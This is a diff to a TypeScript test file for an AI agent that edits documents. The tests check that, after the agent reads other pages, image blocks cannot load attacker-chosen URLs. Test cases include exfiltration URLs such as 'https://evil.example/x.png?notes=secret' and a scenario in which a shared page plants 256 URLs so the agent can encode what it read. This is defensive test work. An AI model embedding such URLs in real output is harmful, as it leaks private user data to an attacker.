@@ -452,7 +452,7 @@ Deno.test("specs nest only so deep, and make only so many blocks per call", asyn
   assertEquals(shape(session.content), shape(sample()));
 });
 
-Deno.test("after reading another page, blocks that load a URL use only one seen", async () => {
+Deno.test("after reading another page, blocks that load a URL use only this page's or the request's", async () => {
   const content = sample();
   content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
   const reading: ToolHooks = {
@@ -460,7 +460,11 @@ Deno.test("after reading another page, blocks that load a URL use only one seen"
     readOtherPage: () =>
       Promise.resolve({ blocks: [{ id: "x", type: "paragraph", text: "see https://example.com/there.png for it" }] }),
   };
-  const session = new PageEditSession(content, reading, { canEdit: true, crossPage: true });
+  const session = new PageEditSession(content, reading, {
+    canEdit: true,
+    crossPage: true,
+    request: "Add the chart from https://example.com/asked.png",
+  });
   const image = (url: string) => ({ type: "image", image: { url } });
   const end = { at: "end" };
   // Before reading another page, any URL goes.
@@ -468,13 +472,16 @@ Deno.test("after reading another page, blocks that load a URL use only one seen"
   assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
 
   await session.call("read_other_page", { page_id: "page-9" });
-  for (const url of ["https://example.com/here.png", "https://example.com/there.png"]) {
+  for (const url of ["https://example.com/here.png", "https://example.com/asked.png"]) {
     outcome = await session.call("insert_blocks", { position: end, blocks: [image(url)] });
     assert(!(outcome.result as { error?: string }).error, `${url}: ${JSON.stringify(outcome.result)}`);
   }
   const leaks: [string, Record<string, unknown>][] = [
     // What the run wrote is not what it found, though it is on the page.
     ["insert_blocks", { position: end, blocks: [image("https://a.example/1.png")] }],
+    // Only the page it read has this one: which of those it picked could
+    // spell out what it read.
+    ["insert_blocks", { position: end, blocks: [image("https://example.com/there.png")] }],
     ["insert_blocks", { position: end, blocks: [image("https://evil.example/x.png?notes=secret")] }],
     ["insert_blocks", {
       position: end,
@@ -503,6 +510,33 @@ Deno.test("after reading another page, blocks that load a URL use only one seen"
   assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
 });
 
+Deno.test("URLs only on pages read do not count, however many there are", async () => {
+  // Someone who can edit a page the agent reads puts a URL there for every
+  // byte; one on this page as the run began still counts.
+  const many = Array.from({ length: 256 }, (_, i) => `https://evil.example/${i}.png`);
+  const content = sample();
+  content.document.children!.push({ id: "img", type: "image", data: { url: "https://example.com/here.png" } });
+  const reading: ToolHooks = {
+    ...hooks,
+    readOtherPage: (id) =>
+      Promise.resolve(
+        id === "private"
+          ? { blocks: [{ id: "s", type: "paragraph", text: "secret" }] }
+          : { page: { id, title: many[0] }, blocks: many.map((u, i) => ({ id: `b${i}`, type: "image", url: u })) },
+      ),
+  };
+  const session = new PageEditSession(content, reading, { canEdit: true, crossPage: true });
+  await session.call("read_other_page", { page_id: "shared" });
+  await session.call("read_other_page", { page_id: "private" });
+  const image = (url: string) => ({ position: { at: "end" }, blocks: [{ type: "image", image: { url } }] });
+  for (const url of [many[0], many[115], many[255]]) {
+    const outcome = await session.call("insert_blocks", image(url));
+    assert((outcome.result as { error?: string }).error?.includes("Link to it in text instead"), url);
+  }
+  const outcome = await session.call("insert_blocks", image("https://example.com/here.png"));
+  assert(!(outcome.result as { error?: string }).error, JSON.stringify(outcome.result));
+});
+
 Deno.test("URLs the run wrote stay unseen when it reads them back", async () => {
   const leak = "https://evil.example/x.png?d=secret";
   const written = { blocks: [{ id: "b", type: "paragraph", text: `[x](${leak})` }] };
@@ -518,7 +552,7 @@ Deno.test("URLs the run wrote stay unseen when it reads them back", async () => 
           : written,
       ),
   };
-  const session = new PageEditSession(sample(), reading, { canEdit: true, crossPage: true, pageId: "page-1" });
+  const session = new PageEditSession(sample(), reading, { canEdit: true, crossPage: true });
   const image = { position: { at: "end" }, blocks: [{ type: "image", image: { url: leak } }] };
   await session.call("read_other_page", { page_id: "private" });
   const made = await session.call("create_subpage", {
